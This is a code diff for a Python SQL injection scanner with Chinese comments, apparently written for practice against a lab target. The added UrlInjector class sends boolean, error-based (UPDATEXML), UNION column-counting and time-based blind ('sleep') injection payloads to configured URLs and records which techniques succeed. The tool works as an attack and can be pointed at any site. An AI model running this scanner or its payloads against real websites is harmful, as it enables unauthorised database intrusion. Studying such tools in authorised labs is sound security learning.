@@ -4,92 +4,147 @@
 # -*- time  : 20201118 -*-
 
 
-import threading
-import queue
+import requests
+import sys
 from time import sleep
+from time import perf_counter
 from userdata import Global_UserData
-from Scanner import UrlInjector
-from savedata_xlsx import SaveXlsx2
+from inj_union import InjUnion
 
-
-# # 初始化全局函数
-# GetResult_ERROR = inj_exp.GetResult_ERROR
-# SelectTables = inj_exp.SelectTables
+print('我被打印了_Scanner.py')
 
 # 初始化全局参数
-# Global_UserData = userdata.Global_UserData
-# Global_XlsSavePath = Global_UserData['XlsSavePath']
-# Global_Headers = {'User-Agent': Global_UserData['User-Agent']}
+Global_XlsSavePath = Global_UserData['XlsSavePath']
+Global_Headers = {'User-Agent': Global_UserData['User-Agent']}
 
 
-class MyThread(threading.Thread):
-    def __init__(self, _lock, _thid, _que):
-        threading.Thread.__init__(self)
-        self.lock = _lock
-        self.thid = _thid
-        self.que = _que
-        self.max = _que.qsize()
+class HTTP(object):
+    content = None
+    con_len = 0
+    old_time = 0.0
+    new_time = 0.0
 
-    def print(self, text: str):
-        self.lock.acquire()
-        print(f'>>{self.name}：{text}')
-        self.lock.release()
+    def GetSelf(self):
+        return self
 
-    def run(self):
-        self.print(f'传入 {self.thid};队列数 {self.max}')
-        # sleep(0.01)
-        while not self.que.empty():
-            task = self.que.get()
-            sleep(0.1)
-            self.print(f'得到队列\t{task}\t/{self.max}')
-            UrlInjector(self.lock, self.name, task)
-            # sleep(0.01)
-        self.print('退出')
+    def GET(self, Url: str):
+        """
+        函数：GET请求
 
+        :param Url: URL统一资源定位器
+        :return: 响应体长度
+        """
+        self.content = requests.get(Url)
+        self.old_time = self.new_time
+        self.new_time = perf_counter()
+        self.con_len = int(self.content.headers['Content-Length']) \
+            if 'Content-Length' in self.content.headers \
+            else int(len(self.content.content))
+        return self.con_len, self.content.status_code,
 
-class ThreadCtrl(object):
-    def funinit(self, thid):
-        return MyThread(self.lock, thid + 1, self.que)
-
-    def __init__(self, _threadNum, _que):
-        self.que = _que
-        self.lock = threading.Lock()
-        self.Threads = list(map(self.funinit, range(_threadNum)))
-
-    def start(self, _bJoin=True):
-        # 循环启动线程
-        for th in self.Threads:
-            th.start()
-
-        # 循环等待线程返回
-        if not _bJoin:
-            return
-        for th in self.Threads:
-            if th.is_alive():
-                th.join()
-        return
-
-
-if __name__ == '__main__':
-    # 初始化队列
-    que = queue.Queue()
-    # 循环加入队列
-    for url in Global_UserData['inj_urls']:
-        que.put(url)
-
-    # 初始化线程，并启动
-    ThreadCtrl(
-        Global_UserData['ThreadNum'],
-        que).start(True)
-
-    print('>主线程开始输出结果')
-    if len(Global_UserData['result']) > 0:
-        SaveXlsx2(Global_UserData['XlsSavePath'], Global_UserData['result'])
-    print('>主线程结束')
     pass
 
-#
-#
+
+class UrlInjector(HTTP):
+    body_len = 0
+
+    def Print(self, text):
+        self._lock.acquire()
+        print(f'>>{self._threadname}：{text}')
+        self._lock.release()
+        pass
+
+    def CheckInj(self):
+        """
+        函数：检查该站点是否存在注入
+
+        :return: T/F=是否存在注入点
+        """
+
+        sleep(0.1)
+        for url_end in Global_UserData['inj_type']:
+            url = self._url % url_end + ' and 0 --+'
+            newlen, code = self.GET(url)
+            self.Print(f'{code=},{newlen=},{self.body_len=}【{url}】')
+            if newlen != self.body_len:
+                # 判断注入方式是否在字典中
+                if '注入方式' not in self._inj_info:
+                    self._inj_info['注入方式'] = {}
+
+                # 判断类型注入
+                if '基于类型注入' not in self._inj_info['注入方式']:
+                    self._url_end = url_end
+                    self._inj_info['注入方式']['基于类型注入'] = self._url % url_end
+
+                # 判断报错注入
+                url = self.url % url_end + ' and UPDATEXML(0,concat(char(126)),0)--+'
+                newlen, code = super().GET(url)
+                if newlen > 0 and "错误注入" not in self._inj_info and \
+                        "XPATH syntax error" in self.content.text:
+                    self._inj_info['注入方式']['基于报错注入'] = self._url % url_end
+            pass
+
+        # 闭合循环完毕，判断联合注入
+        if self._url_end is not None:
+            url0 = self._url % self._url_end + ' union SELECT %s --+'
+            sql_code = ''
+            for i in range(1, 10):
+                sql_code += f'{i},'
+                url = url0 % sql_code[:-1]
+                newlen, code = self.GET(url)
+                self.Print(f'{code=},{newlen=},{i}【{url}】')
+                if newlen == self.body_len:
+                    self._inj_info['注入方式']['基于联合注入'] = i
+                    break
+            pass
+
+        # 判断时间盲注
+        newlen, code = self.GET(self._url % '1')
+        self.Print(f"{code=},{newlen=},{self.new_time}【{self._url % '1'}】")
+        for url_end in Global_UserData['inj_type']:
+            # 循环构造 注入点
+            url = self._url % url_end + ' and if(1,sleep(1),0)--+'
+
+            # 查询新时间
+            newlen, code = self.GET(url)
+            print(f'{code=},{newlen=},{self.new_time}【{url}】')
+
+            # 如果时间相减毫秒数＞900
+            if (self.new_time - self.old_time) * 1000 > 900:
+                self._inj_info['注入方式']['基于时间盲注'] = self._url % url_end
+                break
+
+        # 保存结果
+        self._lock.acquire()
+        print(self._url, self._inj_info)
+        Global_UserData['result'][self._url] = self._inj_info.copy()
+        self._lock.release()
+        pass
+
+    def __init__(self, Lock, ThreadName, Url):
+
+        self._lock = Lock
+        self._threadname = ThreadName
+        self._url = Url
+        # if 'Less-1' not in Url:
+        #     return
+
+        self.Print(f'扫描器传入 {Url=}')
+
+        self.url = Url
+        self.body_len, code = self.GET(Url % '1')
+        self.Print(f'初始化Len {self.body_len}')
+        if not self.body_len > 0:
+            self.Print(f'无法注入，请检查该网页是否正常【{Url % "1"}】')
+            return
+        # self._InjUnion = InjUnion
+        self._inj_info = {}
+        self._url_end = None
+        self.CheckInj()
+        pass
+
+    pass
+
 # class UrlInjector(object):
 #     _url_info = None
 #
